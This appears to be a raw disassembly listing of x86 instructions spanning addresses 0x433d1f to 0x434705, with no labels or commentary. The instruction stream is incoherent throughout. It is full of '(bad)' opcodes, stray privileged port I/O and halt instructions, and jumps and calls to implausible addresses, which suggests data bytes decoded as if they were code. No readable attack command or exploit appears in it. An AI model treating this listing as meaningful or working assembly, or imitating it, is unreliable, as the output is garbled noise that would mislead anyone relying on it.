  433d1f:	cmp    BYTE PTR [edi-0x13ef2b78],al
  433d25:	jb     0x433d95
  433d27:	mov    ds:0xa13f80f4,al
  433d2c:	push   ebx
  433d2d:	pop    esp
  433d2e:	out    dx,eax
  433d2f:	in     eax,0xbd
  433d31:	repnz pop esp
  433d33:	cdq    
  433d34:	add    BYTE PTR [ecx-0x2d10eeef],dh
  433d3a:	mov    ebx,0x1dd6bd5
  433d3f:	mov    al,ds:0xe5f54c10
  433d44:	mov    edi,0x532a79ea
  433d49:	jnp    0x433d8a
  433d4b:	pop    ebp
  433d4c:	jmp    0x433d4d
  433d4e:	out    0x51,eax
  433d50:	hlt    
  433d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433d52:	aas    
  433d53:	push   ebp
  433d54:	or     esp,DWORD PTR [eax]
  433d56:	xor    cl,bh
  433d58:	jae    0x433cdb
  433d5a:	outs   dx,DWORD PTR ds:[esi]
  433d5b:	sbb    eax,0xba529c5b
  433d60:	hlt    
  433d61:	jle    0x433dda
  433d63:	mov    ds:0xfb,eax
	...
  433d7c:	add    BYTE PTR [eax],al
  433d7e:	sub    ebx,DWORD PTR [ebp+0x1b]
  433d81:	add    BYTE PTR [edx],bl
  433d83:	adc    DWORD PTR [ecx-0x2e3950d],edx
  433d89:	imul   ebp,DWORD PTR [ecx+0x1],0xffffffbb
  433d8d:	bswap  esp
  433d8f:	frstpm(287 only) 
  433d91:	es call 0x144336f3
  433d97:	adc    DWORD PTR [eax],eax
  433d99:	bound  eax,QWORD PTR [ecx+0x43a48735]
  433d9f:	(bad)  
  433da1:	in     eax,0x27
  433da3:	jmp    0x62d7:0x16485486
  433daa:	lods   eax,DWORD PTR ds:[esi]
  433dab:	call   0xea0b1f36
  433db0:	push   eax
  433db1:	icebp  
  433db2:	xchg   edx,eax
  433db3:	inc    eax
  433db4:	in     al,dx
  433db5:	jb     0x433dbf
  433db7:	js     0x433e0d
  433db9:	mov    ch,0xaa
  433dbb:	push   esp
  433dbc:	sti    
  433dbd:	sbb    ah,bl
  433dbf:	jg     0x433d80
  433dc1:	idiv   BYTE PTR [ebx+0x4c]
  433dc4:	cli    
  433dc5:	sahf   
  433dc6:	out    0x8b,eax
  433dc8:	inc    esp
  433dc9:	test   DWORD PTR [ebx+0xc],esp
  433dcc:	push   eax
  433dcd:	mov    es,WORD PTR [ecx+0xd]
  433dd0:	xchg   edi,ebp
  433dd2:	sub    eax,0x4af14fe0
  433dd7:	inc    ecx
  433dd8:	clc    
  433dd9:	add    esp,DWORD PTR ds:0xcfe0e83d
  433ddf:	(bad)  
  433de1:	mov    BYTE PTR [eax],0x0
	...
  433df8:	add    BYTE PTR [eax],al
  433dfa:	add    BYTE PTR [ebp+0x3c],al
  433dfd:	leave  
  433dfe:	sub    cl,BYTE PTR [ebp-0x74]
  433e01:	jmp    0x433e6b
  433e03:	xchg   esp,eax
  433e04:	nop
  433e05:	(bad)  
  433e06:	call   0x9e959202
  433e0b:	je     0x433e66
  433e0d:	les    edx,FWORD PTR [ecx-0x54]
  433e10:	push   esi
  433e11:	sti    
  433e12:	xchg   DWORD PTR ss:[ecx+0xc],ebx
  433e16:	bound  ebp,QWORD PTR [esi-0x3d2e99ac]
  433e1c:	xchg   ecx,eax
  433e1d:	mov    esp,0xfadf6695
  433e22:	add    DWORD PTR [ecx-0x56f10541],ebp
  433e28:	cmp    eax,0x571d0085
  433e2d:	and    DWORD PTR [ebx+0x881e090],ecx
  433e33:	fdivr  DWORD PTR ds:0xbfd6520c
  433e39:	dec    esp
  433e3a:	push   eax
  433e3b:	sbb    bh,BYTE PTR [ecx-0x72]
  433e3e:	add    BYTE PTR ds:0xc0c08508,bl
  433e44:	loop   0x433dc7
  433e46:	jne    0x433e81
  433e48:	sar    BYTE PTR [ebp-0x9],0x3b
  433e4c:	xlat   BYTE PTR ds:[ebx]
  433e4d:	loope  0x433e51
  433e4f:	push   cs
  433e50:	enter  0x5e55,0xe6
  433e54:	mov    eax,ds:0x3d0d08bc
  433e59:	sub    esp,0x5c
  433e5c:	les    edi,FWORD PTR [esi+0x0]
	...
  433e76:	add    BYTE PTR [eax],al
  433e78:	fld    QWORD PTR [edi]
  433e7a:	dec    ebx
  433e7b:	push   esi
  433e7c:	and    ah,BYTE PTR [esp+edi*2+0x8]
  433e80:	and    ah,BYTE PTR [ebx+ebp*8+0x56]
  433e84:	out    0x43,eax
  433e86:	pop    eax
  433e87:	call   0x3915e4
  433e8c:	loop   0x433ecc
  433e8e:	bound  ebp,QWORD PTR [esi+0x54]
  433e91:	dec    ebp
  433e92:	in     al,dx
  433e93:	pop    eax
  433e94:	inc    ebp
  433e95:	mov    ch,dh
  433e97:	dec    DWORD PTR [edx+0x3f]
  433e9a:	dec    esi
  433e9b:	push   0xffffffba
  433e9d:	pusha  
  433e9e:	inc    esp
  433e9f:	lock gs mov edi,0xd73aff69
  433ea6:	dec    ebp
  433ea7:	push   esi
  433ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ea9:	inc    ebx
  433eaa:	mov    DWORD PTR [ebp+0x35],eax
  433ead:	push   eax
  433eae:	call   0xf61a0919
  433eb3:	push   edi
  433eb4:	mov    bl,0x41
  433eb6:	ins    DWORD PTR es:[edi],dx
  433eb7:	mov    DWORD PTR [eax-0xb17ad2d],edx
  433ebd:	xchg   esp,eax
  433ebe:	in     eax,dx
  433ebf:	cli    
  433ec0:	pop    ebx
  433ec1:	mov    esi,0xf9b138c9
  433ec6:	jnp    0x433f0c
  433ec8:	dec    esp
  433ec9:	repnz xchg edi,eax
  433ecb:	inc    esp
  433ecc:	inc    ebx
  433ecd:	xchg   ebp,eax
  433ece:	dec    edi
  433ecf:	sti    
  433ed0:	jmp    0x433f3b
  433ed2:	xor    eax,0x75edf401
  433ed7:	pop    esp
  433ed8:	adc    al,0x54
  433eda:	dec    ebx
  433edb:	in     al,0x0
	...
  433ef5:	fstp   QWORD PTR [eax]
  433ef7:	fdiv   QWORD PTR [ebx-0x11]
  433efa:	push   bx
  433efc:	call   0xe82b6f82
  433f01:	jno    0x433ed8
  433f03:	(bad)  
  433f04:	jmp    FWORD PTR [ebp-0x8]
  433f07:	idiv   DWORD PTR [eax]
  433f09:	cdq    
  433f0a:	popf   
  433f0b:	ja     0x433f33
  433f0d:	pop    esi
  433f0e:	(bad)  
  433f10:	je     0x433ed6
  433f12:	inc    esp
  433f13:	fdiv   st(6),st
  433f15:	imul   edi,DWORD PTR [ebx-0x10],0x7c7c61fa
  433f1c:	shl    DWORD PTR [esi+esi*8],0xff
  433f20:	push   esi
  433f21:	jns    0x433f04
  433f23:	sahf   
  433f24:	out    0xd7,eax
  433f26:	jp     0x433f18
  433f28:	cli    
  433f29:	sbb    eax,0x94447af5
  433f2e:	push   edi
  433f2f:	(bad)  
  433f31:	inc    ecx
  433f32:	aam    0xfe
  433f34:	jmp    edi
  433f36:	push   ss
  433f37:	icebp  
  433f38:	je     0x433ed6
  433f3a:	addr16 sub esp,eax
  433f3d:	out    0xab,al
  433f3f:	(bad)  
  433f40:	cli    
  433f41:	mov    ds:0x8f84b05,eax
  433f46:	mov    ds:0xb1f5f783,eax
  433f4b:	je     0x433ed4
  433f4d:	cmp    al,0x5
  433f4f:	push   0xe904f4e3
  433f54:	sbb    esp,0x7
  433f57:	mov    al,ds:0x84
	...
  433f70:	add    BYTE PTR [eax],al
  433f72:	sub    al,0xe3
  433f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433f75:	jbe    0x433f4c
  433f77:	jnp    0x433f46
  433f79:	lds    esp,FWORD PTR [ebx*8+0x5824476f]
  433f80:	in     eax,dx
  433f81:	xor    al,0x34
  433f83:	out    dx,al
  433f84:	jecxz  0x433f61
  433f86:	fyl2x  
  433f88:	loope  0x433f7a
  433f8a:	jl     0x433fd4
  433f8c:	mov    ch,0x2c
  433f8e:	arpl   WORD PTR [ecx+0x2a],bx
  433f91:	jge    0x433fc6
  433f93:	mov    fs,WORD PTR [ebx]
  433f95:	in     al,dx
  433f96:	sbb    edx,DWORD PTR [edx-0x76f10f60]
  433f9c:	test   al,0x77
  433f9e:	lds    ecx,FWORD PTR [edi+0x35abbc2b]
  433fa4:	push   ss
  433fa5:	push   ebp
  433fa6:	out    dx,eax
  433fa7:	push   edi
  433fa8:	cmc    
  433fa9:	jle    0x433fdb
  433fab:	mov    ch,0x35
  433fad:	push   esp
  433fae:	fcomip st,st(7)
  433fb0:	dec    esp
  433fb1:	adc    esi,DWORD PTR [eax*1+0x57f4eb66]
  433fb8:	(bad)  
  433fba:	inc    eax
  433fbb:	shr    DWORD PTR [ebp+0x46],1
  433fbe:	lods   al,BYTE PTR ds:[esi]
  433fbf:	in     al,dx
  433fc0:	mov    cl,bl
  433fc2:	mov    esi,0xc07669e1
  433fc7:	mov    ebp,DWORD PTR [ebx+0x70f7aef7]
  433fcd:	adc    eax,0x76520534
  433fd2:	shr    ah,0xd9
  433fd5:	loopne 0x433fd7
	...
  433fef:	mov    fs,ecx
  433ff1:	into   
  433ff2:	pop    ebp
  433ff3:	jns    0x433f8c
  433ff5:	cld    
  433ff6:	lock jle 0x433fda
  433ff9:	call   DWORD PTR [eax+0x2e754e9f]
  433fff:	outs   dx,DWORD PTR fs:[si]
  434002:	je     0x433fe6
  434004:	pushf  
  434005:	push   edi
  434006:	adc    DWORD PTR [ebx-0x27e904a9],edi
  43400c:	cmp    ah,dh
  43400e:	bound  edx,QWORD PTR [edx]
  434010:	shl    DWORD PTR [esi],0x1a
  434013:	lahf   
  434014:	cmp    DWORD PTR [ecx+ebp*4-0x9],esi
  434018:	or     eax,0xca081944
  43401d:	or     ah,BYTE PTR [ebp-0x32a2e391]
  434023:	lods   al,BYTE PTR ds:[esi]
  434024:	loop   0x433fab
  434026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434027:	lahf   
  434028:	pop    eax
  434029:	adc    BYTE PTR [ebx],bh
  43402b:	shl    DWORD PTR [ebx+edi*8],0x54
  43402f:	sbb    BYTE PTR [eax-0x21e4fa7c],dl
  434035:	cli    
  434036:	mov    esi,0x3cfaf07d
  43403b:	clc    
  43403c:	push   eax
  43403d:	sti    
  43403e:	mul    edx
  434040:	mov    bl,0x86
  434042:	shr    DWORD PTR [edi-0x3a],0xe7
  434046:	push   ebp
  434047:	mov    dl,0xdb
  434049:	cli    
  43404a:	push   0xffffffac
  43404c:	cld    
  43404d:	cli    
  43404e:	adc    al,0xcc
  434050:	call   0x43d800
	...
  434069:	add    BYTE PTR [eax],al
  43406b:	add    bl,bl
  43406d:	(bad)  
  43406f:	hlt    
  434070:	mov    ds:0xe6b53487,eax
  434075:	inc    esp
  434076:	add    BYTE PTR [esi-0x36],ch
  434079:	(bad)  [ecx+ebx*2-0x65]
  43407d:	mov    dh,0xfa
  43407f:	aam    0xbf
  434081:	fcmovnbe st,st(1)
  434083:	push   esi
  434084:	sbb    eax,0xa337fac1
  434089:	pop    ecx
  43408a:	clc    
  43408b:	add    BYTE PTR [edx],dh
  43408d:	mov    bh,0x84
  43408f:	inc    ebp
  434090:	ret    0x564f
  434093:	pop    ebx
  434094:	aam    0xc2
  434096:	push   es
  434097:	add    BYTE PTR [eax+0x181e75b],cl
  43409d:	mov    cl,0xfc
  43409f:	dec    DWORD PTR [ebp+0x5b]
  4340a2:	inc    esp
  4340a3:	or     al,0x9b
  4340a5:	cmp    DWORD PTR [edx+0x73ef8d2c],0x8
  4340ac:	ror    BYTE PTR [ebp-0x10bd02be],0x4a
  4340b3:	mov    DWORD PTR [eax+0x6d23e2d8],edx
  4340b9:	out    dx,eax
  4340ba:	cmc    
  4340bb:	test   DWORD PTR [ebp-0x21],ebx
  4340be:	jle    0x4340a9
  4340c0:	or     al,0x4
  4340c2:	add    BYTE PTR [ebp-0x2e478],cl
  4340c8:	inc    edx
  4340c9:	xor    al,0xe8
  4340cb:	add    al,0x48
  4340cd:	repnz cmc 
  4340cf:	mov    eax,DWORD PTR [eax]
	...
  4340e9:	cmp    eax,0x88f07461
  4340ee:	fld    DWORD PTR ds:0x88d84
  4340f4:	add    BYTE PTR [esi+0xa],ah
  4340f7:	lea    ecx,[ebp-0x2f]
  4340fa:	cmp    BYTE PTR [esi-0x1],cl
  4340fd:	pop    ebp
  4340fe:	cwde   
  4340ff:	cli    
  434100:	(bad)  
  434101:	fisttp QWORD PTR [edx+edi*4-0x62a7f1]
  434108:	dec    ebp
  43410a:	pop    edx
  43410b:	inc    esp
  43410c:	or     al,0x56
  43410e:	fmul   QWORD PTR [ebx+0x50359555]
  434114:	jmp    FWORD PTR [edi+ecx*1-0x7b]
  434118:	rcl    BYTE PTR [edx-0xbfe7274],0xed
  43411f:	dec    BYTE PTR [esi+0x2b]
  434122:	les    esp,FWORD PTR [ebp+ecx*4+0x1]
  434126:	xchg   BYTE PTR [esi-0x18],al
  434129:	sub    bl,BYTE PTR [edx-0x57900517]
  43412f:	mul    BYTE PTR [ebp+0x73]
  434132:	(bad)  
  434133:	lds    ecx,FWORD PTR [edi-0x22]
  434136:	xlat   BYTE PTR ds:[ebx]
  434137:	inc    esi
  434138:	call   0xfb2d6327
  43413d:	pop    ebx
  43413e:	xor    dh,0x86
  434141:	adc    edx,edx
  434143:	or     eax,0xc752f440
  434148:	repnz pop ds
  43414a:	jecxz  0x434111
  43414c:	cli    
	...
  434165:	add    BYTE PTR [ebx],ah
  434167:	xlat   BYTE PTR ds:[ebx]
  434168:	ror    BYTE PTR [edx],0x78
  43416b:	xchg   ecx,eax
  43416c:	add    eax,DWORD PTR [eax]
  43416e:	hlt    
  43416f:	push   0x63
  434171:	or     ah,dh
  434173:	xor    esp,DWORD PTR [ebp-0x73]
  434176:	mov    eax,ds:0xf2e84b79
  43417b:	cmp    ebp,ebp
  43417d:	cli    
  43417e:	jg     0x4341b0
  434180:	add    BYTE PTR [edi-0x27ac8f14],al
  434186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434187:	vfnmsub213ss xmm1{k4},xmm6,DWORD PTR [esi-0x1140b6d]
  434191:	test   BYTE PTR [ecx+edi*8-0x6b9e7906],dh
  434198:	(bad)  
  43419a:	enter  0xec8e,0x88
  43419e:	xor    DWORD PTR [eax+0x97703d8],ecx
  4341a4:	lock dec DWORD PTR [ebp+0x4]
  4341a8:	jnp    0x43421e
  4341aa:	test   ah,dh
  4341ac:	(bad)  
  4341ae:	daa    
  4341af:	add    eax,0x487aed62
  4341b4:	in     eax,dx
  4341b5:	js     0x4341aa
  4341b7:	(bad)  
  4341b8:	mov    ebx,0x328a41e3
  4341bd:	push   edx
  4341be:	and    al,0xde
  4341c0:	push   edi
  4341c1:	cwde   
  4341c2:	sbb    esi,0xffffffe8
  4341c5:	xchg   BYTE PTR [ebx],bh
  4341c7:	pop    eax
  4341c8:	in     al,0x78
	...
  4341e2:	add    al,ch
  4341e4:	in     al,0x40
  4341e6:	lods   al,BYTE PTR ds:[esi]
  4341e7:	fbld   TBYTE PTR [bx+di]
  4341ea:	jnp    0x4341a4
  4341ec:	fmul   QWORD PTR ds:0x1167db08
  4341f2:	add    al,0xda
  4341f4:	imul   ebx,DWORD PTR [edi+esi*4-0x45],0xffffffdd
  4341f9:	add    ebp,ebp
  4341fb:	stos   DWORD PTR es:[edi],eax
  4341fc:	in     al,dx
  4341fd:	xor    esi,DWORD PTR [ecx+0x3f]
  434200:	ficomp WORD PTR [ebp+0x77]
  434203:	sub    al,0x8a
  434205:	xchg   ebx,eax
  434206:	out    dx,eax
  434207:	jb     0x434251
  434209:	fld    QWORD PTR [esi+0x78409c25]
  43420f:	mov    ah,0x4
  434211:	loop   0x43425a
  434213:	add    eax,0xb7fcb688
  434218:	mov    bl,0x65
  43421a:	ret    
  43421b:	test   DWORD PTR [ebx+0x572d023],0xa67c36c
  434225:	inc    ebx
  434226:	and    DWORD PTR [ebx],0x9d071d05
  43422c:	inc    eax
  43422d:	ins    DWORD PTR es:[edi],dx
  43422e:	inc    ebx
  43422f:	hlt    
  434230:	ss aaa 
  434232:	push   ebx
  434233:	add    DWORD PTR [edi-0x223112c8],0xd387f18
  43423d:	sbb    esp,ebx
  43423f:	rol    al,cl
  434241:	push   DWORD PTR [ebp-0x60]
  434244:	pop    esi
  434245:	(bad)  
  434246:	aad    0x0
	...
  434260:	cwde   
  434261:	pop    eax
  434262:	cld    
  434263:	jb     0x43420c
  434265:	fcmovbe st,st(2)
  434267:	pop    esi
  434268:	and    bl,ch
  43426a:	cli    
  43426b:	ds jp  0x434241
  43426e:	jp     0x43425b
  434270:	lds    esi,FWORD PTR [ebp-0x7e7fdd7d]
  434276:	test   cl,ch
  434278:	test   DWORD PTR [esi+eiz*2],0xe458f2bb
  43427f:	xchg   ecx,eax
  434280:	and    eax,0xe4b0e7b6
  434285:	fsqrt  
  434287:	jb     0x434253
  434289:	fmul   DWORD PTR [esp+ebp*4+0x267f4d4f]
  434290:	dec    edi
  434291:	xor    al,BYTE PTR [edi+0x4485a72f]
  434297:	in     eax,dx
  434298:	pop    ds
  434299:	jle    0x434296
  43429b:	neg    BYTE PTR [edi]
  43429d:	cmp    DWORD PTR [edi-0x41250a8b],0x748fa953
  4342a7:	lds    ebp,FWORD PTR [eax+0x1f5a1dec]
  4342ad:	fimul  DWORD PTR [esp+0x72534d08]
  4342b4:	ss dec ebp
  4342b6:	xchg   DWORD PTR [esp+edi*8],esp
  4342b9:	in     al,0x7d
  4342bb:	mov    ch,0xdf
  4342bd:	fild   WORD PTR [ebx-0x3249b57]
  4342c3:	stos   BYTE PTR es:[edi],al
	...
  4342dc:	add    BYTE PTR [edx+0x55],al
  4342df:	lea    edx,[esp+edx*8]
  4342e2:	xor    al,0xe8
  4342e4:	call   0x5d3e2333
  4342e9:	xor    eax,0xe200500d
  4342ee:	pop    ebx
  4342ef:	rcl    DWORD PTR [eax+0x46],0x46
  4342f3:	or     al,0xe8
  4342f5:	cld    
  4342f6:	in     al,dx
  4342f7:	cmc    
  4342f8:	call   DWORD PTR [ecx]
  4342fa:	shr    DWORD PTR [esi+0x2],0x1b
  4342fe:	les    edi,FWORD PTR [esi-0x25]
  434301:	rcr    esi,0xf5
  434304:	jne    0x43429b
  434306:	pop    ebx
  434307:	dec    esp
  434308:	fcomp  QWORD PTR [esi]
  43430a:	cdq    
  43430b:	cmc    
  43430c:	call   0x38f7df
  434311:	mov    edx,0xdee80855
  434316:	mov    esp,0x55d6fff5
  43431b:	lock pop edi
  43431d:	ss pop ebx
  43431f:	inc    esp
  434320:	or     al,0xe6
  434322:	fmul   DWORD PTR [edx-0x1]
  434325:	mov    eax,fs
  434327:	add    DWORD PTR [esi],0x84aef83
  43432d:	jle    0x4342f7
  43432f:	pop    eax
  434330:	leave  
  434331:	psubusw mm7,mm2
  434334:	push   esp
  434335:	xchg   esi,eax
  434336:	mov    esp,0x2c5ec7f
  43433b:	add    BYTE PTR [eax],al
  43433d:	inc    al
  43433f:	xor    al,BYTE PTR [ebp+0x0]
	...
  43435a:	and    eax,0x5d950733
  43435f:	ss dec edi
  434361:	lea    esp,[eax+0x6c]
  434364:	idiv   edi
  434366:	cmp    al,bh
  434368:	inc    ebx
  434369:	call   0x7ea01b
  43436e:	pop    esi
  43436f:	enter  0xe855,0x48
  434373:	push   edx
  434374:	idiv   edi
  434376:	pop    es
  434377:	bound  ecx,QWORD PTR [ebp-0x17b0628b]
  43437d:	xor    ah,0xff
  434380:	out    0xfa,al
  434382:	jg     0x434327
  434384:	dec    esi
  434385:	lea    edi,[ecx-0x27]
  434388:	in     eax,0xfa
  43438a:	mov    ebx,0xf400aafd
  43438f:	in     eax,dx
  434390:	jle    0x43431e
  434392:	imul   ebx,ecx,0x56a3fae7
  434398:	ret    0x52e7
  43439b:	fsub   st,st(5)
  43439d:	cli    
  43439e:	(bad)  
  43439f:	xor    ch,BYTE PTR [edx]
  4343a1:	ret    
  4343a2:	sti    
  4343a3:	popa   
  4343a4:	(bad)  
  4343a5:	inc    DWORD PTR [ebx+0x7bf781ed]
  4343ab:	jmp    0x65fe:0xedf4b77a
  4343b2:	(bad)  
  4343b3:	cmp    BYTE PTR [eax-0x3c],dh
  4343b6:	mov    esp,0x4cec6854
  4343bb:	mov    al,ds:0xfb74
	...
  4343d4:	add    BYTE PTR [eax],al
  4343d6:	add    BYTE PTR [ebx+0x60],dl
  4343d9:	inc    eax
  4343da:	clc    
  4343db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4343dc:	xchg   DWORD PTR [ebx],eax
  4343de:	push   ebx
  4343df:	jno    0x434449
  4343e1:	imul   edi,ebx,0x3b
  4343e4:	fimul  DWORD PTR [ebp+0x4f]
  4343e7:	jge    0x434459
  4343e9:	out    0x88,al
  4343eb:	test   eax,0xe014e8d1
  4343f0:	fnstsw WORD PTR [esi]
  4343f2:	add    BYTE PTR [ecx-0x53],dh
  4343f5:	push   0x14
  4343f7:	sub    DWORD PTR [eax],0x66a34ff0
  4343fd:	mov    esi,0xec40714f
  434402:	out    0xd,eax
  434404:	mov    ebx,0x9327fae7
  434409:	fdiv   st(6),st
  43440b:	jbe    0x4343b1
  43440d:	call   0x99487d9a
  434412:	test   ebx,esp
  434414:	ficom  DWORD PTR [ebx]
  434416:	adc    al,0x5a
  434418:	or     eax,0x32c43f64
  43441d:	cmp    ecx,ebp
  43441f:	call   0xf4871f58
  434424:	test   DWORD PTR [eax+edi*8+0x6f643b19],esp
  43442b:	cmp    BYTE PTR ds:0xda24d881,0x61
  434432:	jge    0x4343e9
  434434:	mov    WORD PTR [ebx+0x414080eb],fs
  43443a:	jnp    0x43443c
	...
  434454:	xor    BYTE PTR [ebp-0x27f080a5],dh
  43445a:	inc    ecx
  43445b:	jmp    0x775884cc
  434460:	mov    eax,0x483f5fdc
  434465:	mov    BYTE PTR [ebx+0x58],ah
  434468:	popa   
  434469:	fisub  DWORD PTR [ecx]
  43446b:	push   esp
  43446c:	imul   ecx,DWORD PTR [eax+0x39],0xebbcb8c1
  434473:	add    esi,esp
  434475:	add    al,0x22
  434477:	aas    
  434478:	push   esp
  434479:	add    al,0xe9
  43447b:	add    esi,esp
  43447d:	shl    DWORD PTR [ebx-0x1725ce21],0x3
  434484:	sbb    al,0x82
  434486:	jns    0x434470
  434488:	push   ds
  434489:	mov    es,WORD PTR [ebx-0x28]
  43448c:	retf   0x20c4
  43448f:	aas    
  434490:	cld    
  434491:	or     DWORD PTR [ebx+eax*8-0x76],edi
  434495:	les    eax,FWORD PTR [esp+ebx*8+0x46]
  434499:	xlat   BYTE PTR ds:[ebx]
  43449a:	shr    eax,0x9e
  43449d:	cmp    bl,BYTE PTR [esi]
  43449f:	mov    ebx,0xe90000b1
  4344a4:	cmp    al,BYTE PTR [edx-0x72349715]
  4344aa:	std    
  4344ab:	call   0x36958ea7
  4344b0:	xor    dh,BYTE PTR [eax]
  4344b2:	lea    ebx,[eax+esi*2]
  4344b5:	xor    eax,ebp
  4344b7:	or     al,0x0
	...
  4344d1:	inc    edi
  4344d2:	fdivp  st(2),st
  4344d4:	mov    edx,0xa7874aa8
  4344d9:	inc    edi
  4344da:	mov    BYTE PTR [ecx+esi*8+0x31fade92],bh
  4344e1:	stc    
  4344e2:	add    al,0x0
  4344e4:	imul   edi,DWORD PTR [edi-0x63a1e45a],0x8c56f85a
  4344ee:	test   DWORD PTR [ebx],ecx
  4344f0:	jmp    0x4344e9
  4344f2:	add    al,0x37
  4344f4:	sub    bh,BYTE PTR [ebp+eax*4+0x3]
  4344f8:	jmp    0x4344f1
  4344fa:	add    al,0x87
  4344fc:	cs (bad) 
  4344fe:	fst    QWORD PTR [edi*2+0x70004509]
  434505:	sbb    dh,BYTE PTR [ebp-0x7ab3d5ca]
  43450b:	out    dx,eax
  43450c:	call   0xb7a94a08
  434511:	retf   0xc458
  434514:	mov    eax,ds:0xfe71041f
  434519:	sbb    eax,DWORD PTR [edx+0x501c99c2]
  43451f:	shr    dh,1
  434521:	icebp  
  434522:	lods   al,BYTE PTR ds:[esi]
  434523:	or     eax,0xbf11f029
  434528:	out    dx,al
  434529:	xchg   ebx,eax
  43452a:	rol    DWORD PTR [eax],0xe9
  43452d:	test   DWORD PTR [ecx+0x4f],0x50d8bd5c
	...
  43454c:	add    BYTE PTR [eax],al
  43454e:	sbb    BYTE PTR [ebx],0xe0
  434551:	push   ecx
  434552:	mov    dl,0xb1
  434554:	add    eax,0xffffffd2
  434557:	test   DWORD PTR [esi-0x7cfb32ff],ebp
  43455d:	inc    ebp
  43455e:	ins    DWORD PTR es:[edi],dx
  43455f:	pop    esp
  434560:	add    ecx,DWORD PTR [ebp-0x72b336f8]
  434566:	or     BYTE PTR [ebp+0x4e54504c],bl
  43456c:	clc    
  43456d:	(bad)  
  43456e:	fsub   QWORD PTR [ebp+eax*4-0x40]
  434572:	mov    ds:0x9d017185,al
  434577:	add    al,0x83
  434579:	inc    ebp
  43457a:	ins    DWORD PTR es:[edi],dx
  43457b:	pop    esp
  43457c:	add    ecx,DWORD PTR [ebp-0x72b337a8]
  434582:	dec    eax
  434583:	les    ecx,FWORD PTR [edx+ebp*2-0x73]
  434587:	xor    esi,edi
  434589:	jne    0x434550
  43458b:	fbstp  TBYTE PTR [ebx-0x34]
  43458e:	pop    ebp
  43458f:	fisttp WORD PTR [edi+0x38]
  434592:	fadd   st,st(0)
  434594:	add    eax,0x19085
  434599:	add    dh,cl
  43459b:	ins    DWORD PTR es:[edi],dx
  43459c:	rol    BYTE PTR [edx+eiz*2],0x85
  4345a0:	xor    al,0x1
  4345a2:	pop    ebp
  4345a3:	add    al,0x83
  4345a5:	inc    ebp
  4345a6:	or     DWORD PTR [ebx+eax*1-0x73],ebx
  4345aa:	mov    BYTE PTR [esp+ecx*2+0x20044d68],bh
	...
  4345c9:	add    BYTE PTR [eax],al
  4345cb:	(bad)  
  4345cc:	fisttp WORD PTR [edi+0x38]
  4345cf:	cwde   
  4345d0:	rol    BYTE PTR ds:0x12d85,0x0
  4345d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345d8:	inc    esp
  4345d9:	call   0x54a04b69
  4345de:	enter  0x1bf4,0x4f
  4345e2:	push   eax
  4345e3:	add    ebx,DWORD PTR ds:0xcf348520
  4345e9:	jg     0x4345eb
  4345eb:	cmc    
  4345ec:	in     eax,dx
  4345ed:	inc    BYTE PTR [esi+0x775c631]
  4345f3:	jno    0x4345e5
  4345f5:	(bad)  
  4345f6:	dec    ebp
  4345f7:	inc    edi
  4345f8:	lahf   
  4345f9:	outs   dx,DWORD PTR ds:[esi]
  4345fa:	enter  0x7724,0x53
  4345fe:	dec    esp
  4345ff:	jno    0x4345ae
  434601:	icebp  
  434602:	test   ah,cl
  434604:	in     eax,dx
  434605:	(bad)  
  434606:	jmp    FWORD PTR [edi+0x28]
  434609:	enter  0x5188,0x5e
  43460d:	sub    al,0x18
  43460f:	sti    
  434610:	addr16 iret 
  434612:	jmp    DWORD PTR [ebx-0x6fa38413]
  434618:	push   edx
  434619:	cmp    ah,ah
  43461b:	xor    DWORD PTR [ecx-0x6f82fbfd],0xe22238ea
  434625:	icebp  
  434626:	sbb    DWORD PTR [ebp-0x13],0x787dfffe
  43462d:	rol    BYTE PTR [esi+0x0],cl
	...
  434647:	add    dl,ch
  434649:	in     eax,0xfd
  43464b:	jl     0x43469d
  43464d:	fcmovnb st,st(5)
  43464f:	xchg   bl,dh
  434651:	mov    al,0x4
  434653:	add    bh,dh
  434655:	mov    ebp,0x78bc256a
  43465a:	push   edi
  43465b:	xchg   DWORD PTR [ebx-0x5bbfa71b],edi
  434661:	dec    BYTE PTR [edi]
  434663:	jo     0x43466c
  434665:	scas   al,BYTE PTR es:[edi]
  434666:	inc    BYTE PTR [esp+esi*1-0x5404b7a7]
  43466d:	in     eax,0x7d
  43466f:	(bad)  
  434670:	sbb    eax,DWORD PTR [esp+esi*2]
  434673:	aaa    
  434674:	or     al,0xec
  434676:	jmp    0x5f1a554c
  43467b:	int3   
  43467c:	sbb    cl,BYTE PTR [edi]
  43467e:	pop    esi
  43467f:	cmp    eax,0x54296aec
  434684:	out    dx,eax
  434685:	lock dec esp
  434687:	adc    DWORD PTR [eax*1+0x1a67c46c],esi
  43468e:	stos   BYTE PTR es:[edi],al
  43468f:	ins    DWORD PTR es:[edi],dx
  434690:	in     al,dx
  434691:	xor    DWORD PTR [eax-0x6efaa61b],0x91d6beba
  43469b:	jns    0x434668
  43469d:	or     BYTE PTR [ecx+0x662dee70],0xbc
  4346a4:	scas   al,BYTE PTR es:[edi]
  4346a5:	mov    BYTE PTR [ebx],ch
  4346a7:	in     al,dx
  4346a8:	xchg   ebx,eax
  4346a9:	mov    ecx,0xe597
	...
  4346c2:	add    BYTE PTR [eax],al
  4346c4:	add    BYTE PTR [esi-0x73b26f75],bl
  4346ca:	jns    0x43471b
  4346cc:	in     eax,0x8e
  4346ce:	cmp    DWORD PTR ds:0x2911e470,0xa889205c
  4346d8:	add    esi,DWORD PTR [eax+ecx*4]
  4346db:	mov    bl,0xeb
  4346dd:	pop    ebx
  4346de:	lds    edx,FWORD PTR [edi]
  4346e0:	in     eax,0x6e
  4346e2:	(bad)  
  4346e3:	stos   DWORD PTR es:[edi],eax
  4346e4:	out    dx,eax
  4346e5:	jp     0x434727
  4346e7:	xor    eax,0xf8e8b081
  4346ec:	sub    BYTE PTR [esi-0x207e1600],dh
  4346f2:	aad    0x11
  4346f4:	in     eax,0x12
  4346f6:	mov    edx,0xd6383f5d
  4346fb:	jp     0x4346f8
  4346fd:	jp     0x43470c
  4346ff:	cdq    
  434700:	in     al,0xc4
  434702:	cld    
  434703:	push   ebp
  434705:	loop   0x4346db
